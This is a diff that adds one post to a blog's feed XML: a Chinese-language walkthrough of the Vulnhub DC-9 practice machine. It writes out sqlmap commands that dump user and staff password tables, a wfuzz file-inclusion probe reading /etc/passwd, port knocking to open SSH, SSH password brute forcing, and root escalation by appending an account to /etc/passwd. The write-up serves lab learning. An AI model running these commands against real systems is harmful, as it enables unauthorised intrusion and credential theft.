@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Vulnhub-DC9</title>
+      <link href="/posts/35045482/"/>
+      <url>/posts/35045482/</url>
+      
+        <content type="html"><![CDATA[<h2 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>下载好靶机后，将靶机网络设置为net模式</p><p>kali扫描主机 <code>arcp-scan -l</code></p><p><img src="https://pic.imgdb.cn/item/66dabed4d9c307b7e9271e17.png"></p><p>访问页面</p><p><img src="https://pic.imgdb.cn/item/66dabef1d9c307b7e92733a7.png"></p><p>dirb扫描发现扫出来的目录与页面展示的目录一样‘</p><p><img src="https://pic.imgdb.cn/item/66dae157d9c307b7e95311c4.png"></p><p><img src="https://pic.imgdb.cn/item/66dae171d9c307b7e9535971.png"></p><p>nmap扫描查看开放的端口</p><p><img src="https://pic.imgdb.cn/item/66dae206d9c307b7e9540bfb.png"></p><p>80端口开放，22端口关闭</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在&#x2F;search.php页面存在登录界面，猜测存在sql注入</p><p>sqlmap测试</p><p><img src="https://pic.imgdb.cn/item/66dae387d9c307b7e956842f.png"></p><p>存在sql注入漏洞，依次爆库名，表名，列名</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch --dbs</code></p><p><img src="https://pic.imgdb.cn/item/66dae428d9c307b7e957e370.png"></p><p>首先查看users库的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users --tables</code></p><p><img src="https://pic.imgdb.cn/item/66dae4a5d9c307b7e958901a.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae533d9c307b7e959a422.png"></p><p>查看username与password的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails -C username,password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae59dd9c307b7e95a6f24.png"></p><p>将得到的username与password分别保存到user与password中</p><p>选一个用户在&#x2F;manage.php页面登录，发现报错</p><p>接着查看Staff库的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae67ad9c307b7e95cf176.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff -T Users -C Username,Password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae74ad9c307b7e95e4f32.png"></p><p>发现一个新的账号和密码，尝试登录发现成功</p><p><img src="https://pic.imgdb.cn/item/66dae7a1d9c307b7e95e98c1.png"></p><p>根据成功登录后的界面File does not exist猜测可能存在文件包含漏洞</p><p><code>noglob wfuzz -c -u http://192.168.154.136/manage.php?FUZZ=../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;Cookie:PHPSESSID=80guork76fj0lt1gq8nvnasdhb&quot; --hw 100</code></p><p><img src="https://pic.imgdb.cn/item/66daec6ed9c307b7e9638d6f.png"></p><p>存在file参数</p><p>尝试使用BurpSuite爆破</p><p><img src="https://pic.imgdb.cn/item/66daedabd9c307b7e964bcd0.png"></p><p>接着访问&#x2F;proc&#x2F;sched_debug查看cpu的调度状况</p><p><img src="https://pic.imgdb.cn/item/66daeeb3d9c307b7e965ce40.png"></p><p>在调度进程中发现knockd</p><p><img src="https://pic.imgdb.cn/item/66daef07d9c307b7e966d7ac.png"></p><p>knockd.conf文件存在于&#x2F;etc&#x2F;knockd.conf下，与ssh端口的开放有关</p><p>访问knockd的目录，查看其内容</p><p><img src="https://pic.imgdb.cn/item/66daefaed9c307b7e96894a9.png"></p><p>意思为依次顺序访问7469，8475，9842端口后，ssh的22端口开放，逆序访问则关闭，那么依次访问端口</p><p><img src="https://pic.imgdb.cn/item/66daf041d9c307b7e969ab56.png"></p><p>访问后发现22端口开放</p><p>下面从22端口入手，将上文中我们得到的用户名和密码爆破</p><p><img src="https://pic.imgdb.cn/item/66daf11bd9c307b7e96ba1e7.png"></p><p>得到三个用户名与密码</p><p>依次尝试ssh连接，在janitor用户下发现多一层目录</p><p><img src="https://pic.imgdb.cn/item/66daf1c4d9c307b7e96d2aab.png"></p><p>发现新的密码，将新的密码保存起来，再结合之前的用户名再次爆破</p><p><img src="https://pic.imgdb.cn/item/66daf2dcd9c307b7e96ec197.png"></p><p>发现新的用户名和密码，ssh连接访问</p><p><img src="https://pic.imgdb.cn/item/66daf3bcd9c307b7e9710a4b.png"></p><p>sudo -l查看用户权限</p><p>发现可以不需要密码访问test</p><p>查看test的文件属性，发现使可执行文件</p><p><img src="https://pic.imgdb.cn/item/66daf49ed9c307b7e973050e.png"></p><p>在&#x2F;opt&#x2F;devstuff&#x2F;下可以发现源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>作用就是将一个文件的内容读取出来，并追加到另一个文件中</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>那么我们可以尝试直接追加一个有root权限的账号到&#x2F;etc&#x2F;passwd中</p><p><img src="https://pic.imgdb.cn/item/66daf5a2d9c307b7e973fc12.png"></p><p>先将生成的账号添加到临时文件中，再使用test追加到&#x2F;etc&#x2F;passwd&#x2F;中</p><p><img src="https://pic.imgdb.cn/item/66daf67fd9c307b7e974c5fd.png"></p><p>提权后访问&#x2F;root&#x2F;成功拿到flag</p><p><img src="https://pic.imgdb.cn/item/66daf6ead9c307b7e97522c7.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnhub靶机--AI-Web1</title>
       <link href="/posts/ff3ef111/"/>
       <url>/posts/ff3ef111/</url>
